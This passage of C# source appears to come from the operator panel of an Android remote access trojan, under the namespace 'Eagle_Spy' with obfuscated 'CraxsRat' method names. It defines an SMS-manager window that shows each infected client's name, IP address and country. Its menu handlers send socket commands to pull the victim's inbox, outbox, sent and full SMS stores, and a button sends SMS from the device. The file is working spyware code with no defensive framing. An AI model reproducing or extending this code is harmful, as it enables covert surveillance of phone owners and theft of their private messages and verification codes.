using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Eagle_Spy.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class SMSManager : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV0")]
	private DataGridView _DGV0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("AllToolStripMenuItem")]
	private ToolStripMenuItem _AllToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OutboxToolStripMenuItem")]
	private ToolStripMenuItem _OutboxToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("InboxToolStripMenuItem")]
	private ToolStripMenuItem _InboxToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SentToolStripMenuItem")]
	private ToolStripMenuItem _SentToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("QueuedToolStripMenuItem")]
	private ToolStripMenuItem _QueuedToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("FailedToolStripMenuItem")]
	private ToolStripMenuItem _FailedToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveToolStripMenuItem")]
	private ToolStripMenuItem _SaveToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveAsToolStripMenuItem")]
	private ToolStripMenuItem _SaveAsToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private System.Windows.Forms.Timer _TOpacity;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BoxTitle")]
	private PictureBox _BoxTitle;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar1")]
	private DrakeUIAvatar _DrakeUIAvatar1;

	public TcpClient Client;

	public Client classClient;

	public string Title;

	public string tmpFolderUSER;

	public string tmpClientName;

	public string tmpCountry;

	public string tmpAddressIP;

	private bool BoxTitlePaintEventArgsWait;

	internal DataGridView DGV0
;

	[field: AccessedThroughProperty("ctx")]
	internal ContextMenuStrip ctx
    ;

    [field: AccessedThroughProperty("PathsToolStripMenuItem")]
	internal ToolStripMenuItem PathsToolStripMenuItem
    ;

	internal ToolStripMenuItem AllToolStripMenuItem
	;

	internal ToolStripMenuItem OutboxToolStripMenuItem
	;

	internal ToolStripMenuItem InboxToolStripMenuItem
	;

	internal ToolStripMenuItem SentToolStripMenuItem
	;

	internal ToolStripMenuItem QueuedToolStripMenuItem
	;
	internal ToolStripMenuItem FailedToolStripMenuItem
	;

	internal ToolStripMenuItem SaveToolStripMenuItem
	;

	internal ToolStripMenuItem SaveAsToolStripMenuItem
;


	internal System.Windows.Forms.Timer TOpacity
	;

	[field: AccessedThroughProperty("PB")]
	internal ProgressBar PB
    ;

	internal PictureBox BoxTitle
	;

	[field: AccessedThroughProperty("Column1")]
	internal DataGridViewTextBoxColumn Column1
    ;

    [field: AccessedThroughProperty("Column6")]
	internal DataGridViewTextBoxColumn Column6
    ;

    [field: AccessedThroughProperty("Column9")]
	internal DataGridViewTextBoxColumn Column9
    ;

    [field: AccessedThroughProperty("Column7")]
	internal DataGridViewTextBoxColumn Column7
    ;

    [field: AccessedThroughProperty("Column2")]
	internal DataGridViewTextBoxColumn Column2
    ;

    [field: AccessedThroughProperty("Column3")]
	internal DataGridViewImageColumn Column3
    ;

	internal DrakeUIAvatar DrakeUIAvatar1
	;

	[field: AccessedThroughProperty("DrakeUIToolTip1")]
	internal DrakeUIToolTip DrakeUIToolTip1
    ;

    [field: AccessedThroughProperty("Panel2")]
	internal Panel Panel2
    ;

    [field: AccessedThroughProperty("clinameinfo")]
	internal Label clinameinfo
;

    [field: AccessedThroughProperty("ClientPic")]
	internal PictureBox ClientPic
    ;

    [field: AccessedThroughProperty("Panel1")]
	internal Panel Panel1
;
    private Panel panel3;
    private Label label1;
    private Label label2;
    [field: AccessedThroughProperty("showtext")]
	internal TextBox showtext
    ;

    public SMSManager()
	{
		base.Load += CraxsRatkfvuiorkenfudpajrsnCraxsRatsqazfghs;
		base.Closing += SMSManager_Closing;
		base.Activated += AngelAndroidForm_Activated;
		base.Deactivate += AngelAndroidForm_Deactivate;
		Title = "null";
		BoxTitlePaintEventArgsWait = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
            this.components = new System.ComponentModel.Container();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle1 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
            this.DGV0 = new System.Windows.Forms.DataGridView();
            this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column9 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column7 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column3 = new System.Windows.Forms.DataGridViewImageColumn();
            this.ctx = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.PathsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.AllToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.OutboxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.InboxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SentToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.QueuedToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.FailedToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SaveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SaveAsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.TOpacity = new System.Windows.Forms.Timer(this.components);
            this.PB = new System.Windows.Forms.ProgressBar();
            this.BoxTitle = new System.Windows.Forms.PictureBox();
            this.DrakeUIAvatar1 = new DrakeUI.Framework.DrakeUIAvatar();
            this.DrakeUIToolTip1 = new DrakeUI.Framework.DrakeUIToolTip(this.components);
            this.Panel2 = new System.Windows.Forms.Panel();
            this.clinameinfo = new System.Windows.Forms.Label();
            this.ClientPic = new System.Windows.Forms.PictureBox();
            this.Panel1 = new System.Windows.Forms.Panel();
            this.label2 = new System.Windows.Forms.Label();
            this.panel3 = new System.Windows.Forms.Panel();
            this.label1 = new System.Windows.Forms.Label();
            this.showtext = new System.Windows.Forms.TextBox();
            ((System.ComponentModel.ISupportInitialize)(this.DGV0)).BeginInit();
            this.ctx.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.BoxTitle)).BeginInit();
            this.Panel2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.ClientPic)).BeginInit();
            this.Panel1.SuspendLayout();
            this.panel3.SuspendLayout();
            this.SuspendLayout();
            // 
            // DGV0
            // 
            this.DGV0.AllowUserToAddRows = false;
            this.DGV0.AllowUserToDeleteRows = false;
            this.DGV0.AllowUserToResizeColumns = false;
            this.DGV0.AllowUserToResizeRows = false;
            dataGridViewCellStyle1.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle1.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle1.SelectionBackColor = System.Drawing.Color.Red;
            dataGridViewCellStyle1.SelectionForeColor = System.Drawing.Color.White;
            this.DGV0.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle1;
            this.DGV0.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
            this.DGV0.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.DGV0.BackgroundColor = System.Drawing.Color.Black;
            this.DGV0.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.DGV0.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
            this.DGV0.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle2.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle2.Font = new System.Drawing.Font("Calibri", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle2.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.Red;
            dataGridViewCellStyle2.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DGV0.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
            this.DGV0.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.DGV0.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.Column1,
            this.Column6,
            this.Column9,
            this.Column7,
            this.Column2,
            this.Column3});
            this.DGV0.ContextMenuStrip = this.ctx;
            dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle3.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle3.Font = new System.Drawing.Font("Calibri", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle3.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.Red;
            dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.DGV0.DefaultCellStyle = dataGridViewCellStyle3;
            this.DGV0.Dock = System.Windows.Forms.DockStyle.Fill;
            this.DGV0.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.DGV0.EnableHeadersVisualStyles = false;
            this.DGV0.GridColor = System.Drawing.Color.Red;
            this.DGV0.Location = new System.Drawing.Point(0, 0);
            this.DGV0.Name = "DGV0";
            this.DGV0.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle4.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle4.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle4.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.Red;
            dataGridViewCellStyle4.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DGV0.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
            this.DGV0.RowHeadersVisible = false;
            dataGridViewCellStyle5.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.Red;
            dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.White;
            this.DGV0.RowsDefaultCellStyle = dataGridViewCellStyle5;
            this.DGV0.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.DGV0.Size = new System.Drawing.Size(506, 555);
            this.DGV0.TabIndex = 3;
            this.DGV0.CellClick += new System.Windows.Forms.DataGridViewCellEventHandler(this.DGV0_CellClick);
            this.DGV0.CellContentClick += new System.Windows.Forms.DataGridViewCellEventHandler(this.DGV0_CellContentClick);
            this.DGV0.RowEnter += new System.Windows.Forms.DataGridViewCellEventHandler(this.DGV0_RowEnter);
            this.DGV0.RowsAdded += new System.Windows.Forms.DataGridViewRowsAddedEventHandler(this.DGV0_RowsAdded);
            this.DGV0.RowsRemoved += new System.Windows.Forms.DataGridViewRowsRemovedEventHandler(this.DGV0_RowsRemoved);
            this.DGV0.SelectionChanged += new System.EventHandler(this.DGV0_SelectionChanged);
            // 
            // Column1
            // 
            this.Column1.HeaderText = "address";
            this.Column1.Name = "Column1";
            this.Column1.Width = 65;
            // 
            // Column6
            // 
            this.Column6.HeaderText = "name";
            this.Column6.Name = "Column6";
            this.Column6.Width = 56;
            // 
            // Column9
            // 
            this.Column9.HeaderText = "date";
            this.Column9.Name = "Column9";
            this.Column9.Width = 51;
            // 
            // Column7
            // 
            this.Column7.HeaderText = "part";
            this.Column7.Name = "Column7";
            this.Column7.Width = 49;
            // 
            // Column2
            // 
            this.Column2.HeaderText = "path";
            this.Column2.Name = "Column2";
            this.Column2.Width = 51;
            // 
            // Column3
            // 
            this.Column3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
            this.Column3.FillWeight = 1F;
            this.Column3.HeaderText = "";
            this.Column3.MinimumWidth = 2;
            this.Column3.Name = "Column3";
            this.Column3.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.Programmatic;
            this.Column3.Width = 2;
            // 
            // ctx
            // 
            this.ctx.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.ctx.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.PathsToolStripMenuItem,
            this.SaveToolStripMenuItem,
            this.SaveAsToolStripMenuItem});
            this.ctx.Name = "ContextMenuStrip1";
            this.ctx.ShowImageMargin = false;
            this.ctx.Size = new System.Drawing.Size(90, 70);
            // 
            // PathsToolStripMenuItem
            // 
            this.PathsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.AllToolStripMenuItem,
            this.OutboxToolStripMenuItem,
            this.InboxToolStripMenuItem,
            this.SentToolStripMenuItem,
            this.QueuedToolStripMenuItem,
            this.FailedToolStripMenuItem});
            this.PathsToolStripMenuItem.Name = "PathsToolStripMenuItem";
            this.PathsToolStripMenuItem.Size = new System.Drawing.Size(89, 22);
            this.PathsToolStripMenuItem.Text = "Paths";
            // 
            // AllToolStripMenuItem
            // 
            this.AllToolStripMenuItem.Name = "AllToolStripMenuItem";
            this.AllToolStripMenuItem.Size = new System.Drawing.Size(114, 22);
            this.AllToolStripMenuItem.Text = "all";
            this.AllToolStripMenuItem.Click += new System.EventHandler(this.AllToolStripMenuItem_Click);
            // 
            // OutboxToolStripMenuItem
            // 
            this.OutboxToolStripMenuItem.Name = "OutboxToolStripMenuItem";
            this.OutboxToolStripMenuItem.Size = new System.Drawing.Size(114, 22);
            this.OutboxToolStripMenuItem.Text = "outbox";
            this.OutboxToolStripMenuItem.Click += new System.EventHandler(this.OutboxToolStripMenuItem_Click);
            // 
            // InboxToolStripMenuItem
            // 
            this.InboxToolStripMenuItem.Name = "InboxToolStripMenuItem";
            this.InboxToolStripMenuItem.Size = new System.Drawing.Size(114, 22);
            this.InboxToolStripMenuItem.Text = "inbox";
            this.InboxToolStripMenuItem.Click += new System.EventHandler(this.InboxToolStripMenuItem_Click);
            // 
            // SentToolStripMenuItem
            // 
            this.SentToolStripMenuItem.Name = "SentToolStripMenuItem";
            this.SentToolStripMenuItem.Size = new System.Drawing.Size(114, 22);
            this.SentToolStripMenuItem.Text = "sent";
            this.SentToolStripMenuItem.Click += new System.EventHandler(this.SentToolStripMenuItem_Click);
            // 
            // QueuedToolStripMenuItem
            // 
            this.QueuedToolStripMenuItem.Name = "QueuedToolStripMenuItem";
            this.QueuedToolStripMenuItem.Size = new System.Drawing.Size(114, 22);
            this.QueuedToolStripMenuItem.Text = "queued";
            this.QueuedToolStripMenuItem.Click += new System.EventHandler(this.QueuedToolStripMenuItem_Click);
            // 
            // FailedToolStripMenuItem
            // 
            this.FailedToolStripMenuItem.Name = "FailedToolStripMenuItem";
            this.FailedToolStripMenuItem.Size = new System.Drawing.Size(114, 22);
            this.FailedToolStripMenuItem.Text = "failed";
            this.FailedToolStripMenuItem.Click += new System.EventHandler(this.FailedToolStripMenuItem_Click);
            // 
            // SaveToolStripMenuItem
            // 
            this.SaveToolStripMenuItem.Name = "SaveToolStripMenuItem";
            this.SaveToolStripMenuItem.Size = new System.Drawing.Size(89, 22);
            this.SaveToolStripMenuItem.Text = "Save";
            this.SaveToolStripMenuItem.Visible = false;
            this.SaveToolStripMenuItem.Click += new System.EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatszxcytrqa);
            // 
            // SaveAsToolStripMenuItem
            // 
            this.SaveAsToolStripMenuItem.Name = "SaveAsToolStripMenuItem";
            this.SaveAsToolStripMenuItem.Size = new System.Drawing.Size(89, 22);
            this.SaveAsToolStripMenuItem.Text = "Save As";
            this.SaveAsToolStripMenuItem.Visible = false;
            this.SaveAsToolStripMenuItem.Click += new System.EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsjufrswas);
            // 
            // TOpacity
            // 
            this.TOpacity.Interval = 1;
            this.TOpacity.Tick += new System.EventHandler(this.TOpacity_Tick);
            // 
            // PB
            // 
            this.PB.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.PB.Location = new System.Drawing.Point(0, 555);
            this.PB.Name = "PB";
            this.PB.Size = new System.Drawing.Size(506, 10);
            this.PB.TabIndex = 6;
            // 
            // BoxTitle
            // 
            this.BoxTitle.BackColor = System.Drawing.Color.Red;
            this.BoxTitle.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.BoxTitle.ErrorImage = null;
            this.BoxTitle.InitialImage = null;
            this.BoxTitle.Location = new System.Drawing.Point(0, 565);
            this.BoxTitle.Name = "BoxTitle";
            this.BoxTitle.Size = new System.Drawing.Size(506, 18);
            this.BoxTitle.TabIndex = 7;
            this.BoxTitle.TabStop = false;
            this.BoxTitle.Paint += new System.Windows.Forms.PaintEventHandler(this.BoxTitle_Paint);
            this.BoxTitle.Resize += new System.EventHandler(this.BoxTitle_Resize);
            // 
            // DrakeUIAvatar1
            // 
            this.DrakeUIAvatar1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.DrakeUIAvatar1.BackColor = System.Drawing.Color.Transparent;
            this.DrakeUIAvatar1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIAvatar1.FillColor = System.Drawing.Color.Black;
            this.DrakeUIAvatar1.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIAvatar1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIAvatar1.Location = new System.Drawing.Point(211, 536);
            this.DrakeUIAvatar1.Margin = new System.Windows.Forms.Padding(2);
            this.DrakeUIAvatar1.Name = "DrakeUIAvatar1";
            this.DrakeUIAvatar1.Size = new System.Drawing.Size(42, 37);
            this.DrakeUIAvatar1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar1.Symbol = 61912;
            this.DrakeUIAvatar1.TabIndex = 9;
            this.DrakeUIAvatar1.Text = "DrakeUIAvatar1";
            this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar1, "Send SMS");
            this.DrakeUIAvatar1.Click += new System.EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwsakartx);
            // 
            // DrakeUIToolTip1
            // 
            this.DrakeUIToolTip1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(54)))), ((int)(((byte)(54)))));
            this.DrakeUIToolTip1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(239)))), ((int)(((byte)(239)))), ((int)(((byte)(239)))));
            this.DrakeUIToolTip1.OwnerDraw = true;
            // 
            // Panel2
            // 
            this.Panel2.BackColor = System.Drawing.Color.Black;
            this.Panel2.Controls.Add(this.clinameinfo);
            this.Panel2.Controls.Add(this.ClientPic);
            this.Panel2.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Panel2.ForeColor = System.Drawing.Color.Red;
            this.Panel2.Location = new System.Drawing.Point(0, 0);
            this.Panel2.Margin = new System.Windows.Forms.Padding(2);
            this.Panel2.Name = "Panel2";
            this.Panel2.Size = new System.Drawing.Size(506, 583);
            this.Panel2.TabIndex = 10;
            // 
            // clinameinfo
            // 
            this.clinameinfo.BackColor = System.Drawing.Color.Transparent;
            this.clinameinfo.Dock = System.Windows.Forms.DockStyle.Fill;
            this.clinameinfo.Font = new System.Drawing.Font("Calibri", 9F);
            this.clinameinfo.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.clinameinfo.Location = new System.Drawing.Point(32, 0);
            this.clinameinfo.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.clinameinfo.Name = "clinameinfo";
            this.clinameinfo.Size = new System.Drawing.Size(474, 583);
            this.clinameinfo.TabIndex = 12;
            this.clinameinfo.Text = "...";
            this.clinameinfo.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // ClientPic
            // 
            this.ClientPic.Dock = System.Windows.Forms.DockStyle.Left;
            this.ClientPic.Location = new System.Drawing.Point(0, 0);
            this.ClientPic.Margin = new System.Windows.Forms.Padding(2, 3, 2, 3);
            this.ClientPic.Name = "ClientPic";
            this.ClientPic.Size = new System.Drawing.Size(32, 583);
            this.ClientPic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.ClientPic.TabIndex = 11;
            this.ClientPic.TabStop = false;
            // 
            // Panel1
            // 
            this.Panel1.BackColor = System.Drawing.Color.Black;
            this.Panel1.Controls.Add(this.label2);
            this.Panel1.Controls.Add(this.panel3);
            this.Panel1.Controls.Add(this.DrakeUIAvatar1);
            this.Panel1.Controls.Add(this.showtext);
            this.Panel1.Dock = System.Windows.Forms.DockStyle.Right;
            this.Panel1.Font = new System.Drawing.Font("Calibri", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Panel1.ForeColor = System.Drawing.Color.White;
            this.Panel1.Location = new System.Drawing.Point(506, 0);
            this.Panel1.Margin = new System.Windows.Forms.Padding(2);
            this.Panel1.Name = "Panel1";
            this.Panel1.Size = new System.Drawing.Size(287, 583);
            this.Panel1.TabIndex = 11;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Calibri", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.Location = new System.Drawing.Point(52, 548);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(140, 19);
            this.label2.TabIndex = 10;
            this.label2.Text = "OPEN SMS SENDER";
            // 
            // panel3
            // 
            this.panel3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.panel3.Controls.Add(this.label1);
            this.panel3.Location = new System.Drawing.Point(37, 12);
            this.panel3.Name = "panel3";
            this.panel3.Size = new System.Drawing.Size(200, 37);
            this.panel3.TabIndex = 1;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Calibri", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.Location = new System.Drawing.Point(40, 10);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(121, 19);
            this.label1.TabIndex = 0;
            this.label1.Text = "SMS Texts here !";
            // 
            // showtext
            // 
            this.showtext.BackColor = System.Drawing.Color.Black;
            this.showtext.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.showtext.Font = new System.Drawing.Font("Bahnschrift", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.showtext.ForeColor = System.Drawing.Color.White;
            this.showtext.Location = new System.Drawing.Point(0, 74);
            this.showtext.Margin = new System.Windows.Forms.Padding(2);
            this.showtext.Multiline = true;
            this.showtext.Name = "showtext";
            this.showtext.Size = new System.Drawing.Size(287, 458);
            this.showtext.TabIndex = 0;
            // 
            // SMSManager
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(793, 583);
            this.Controls.Add(this.DGV0);
            this.Controls.Add(this.PB);
            this.Controls.Add(this.BoxTitle);
            this.Controls.Add(this.Panel2);
            this.Controls.Add(this.Panel1);
            this.MaximumSize = new System.Drawing.Size(809, 622);
            this.MinimumSize = new System.Drawing.Size(809, 622);
            this.Name = "SMSManager";
            this.Opacity = 0D;
            this.ShowIcon = false;
            this.Text = "SMSManager";
            ((System.ComponentModel.ISupportInitialize)(this.DGV0)).EndInit();
            this.ctx.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.BoxTitle)).EndInit();
            this.Panel2.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.ClientPic)).EndInit();
            this.Panel1.ResumeLayout(false);
            this.Panel1.PerformLayout();
            this.panel3.ResumeLayout(false);
            this.panel3.PerformLayout();
            this.ResumeLayout(false);

	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
			base.Opacity += 0.1;
		else
			TOpacity.Enabled = false;
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqazfghs(object sender, EventArgs e)
	{
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\14.ico");
		try
		{
			ClientPic.Image = classClient.Wallpaper;
			clinameinfo.Text = "Name: " + classClient.ClientName + Strings.Space(2) + "IP: " + classClient.ClientAddressIP + Strings.Space(2) + "Country: " + classClient.Country;
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		((ToolStripDropDownMenu)PathsToolStripMenuItem.DropDown).ShowImageMargin = false;
		((ToolStripDropDownMenu)PathsToolStripMenuItem.DropDown).BackColor = ctx.BackColor;
		DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
		DGV0.DefaultCellStyle.Font = reso.f;
		if (Operators.CompareString(SpySettings.SAVING_DATA, "No", TextCompare: false) == 0)
		{
			SaveToolStripMenuItem.Visible = true;
			SaveAsToolStripMenuItem.Visible = true;
		}
		Text = Title;
		TOpacity.Interval = SpySettings.T_Interval;
		TOpacity.Enabled = true;
		BoxTitlePaintEventArgsWait = true;
	}

	private void DGV0_CellContentClick(object sender, DataGridViewCellEventArgs e)
	{
	}

	private void DGV0_CellClick(object sender, DataGridViewCellEventArgs e)
	{
		if ((e.RowIndex != -1) & (e.ColumnIndex != -1))
			SelectMessage(e.RowIndex);
	}

	private void DGV0_RowEnter(object sender, DataGridViewCellEventArgs e)
	{
		if ((e.RowIndex != -1) & (e.ColumnIndex != -1))
			SelectMessage(e.RowIndex);
	}

	private void SelectMessage(int index)
	{
		if (index != -1)
			showtext.Text = Conversions.ToString(DGV0.Rows[index].Tag);
	}

	private void SMSManager_Closing(object sender, CancelEventArgs e)
	{
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb(string v)
	{
		if (classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".sms" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getSMS + Data.SPL_SOCKET + "sms" + Data.SPL_DATA + v,
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
	}

	private void AllToolStripMenuItem_Click(object sender, EventArgs e)
	{
		CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/");
	}

	private void OutboxToolStripMenuItem_Click(object sender, EventArgs e)
	{
		CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/outbox");
	}

	private void InboxToolStripMenuItem_Click(object sender, EventArgs e)
	{
		CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/inbox");
	}

	private void SentToolStripMenuItem_Click(object sender, EventArgs e)
	{
		CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/sent");
	}

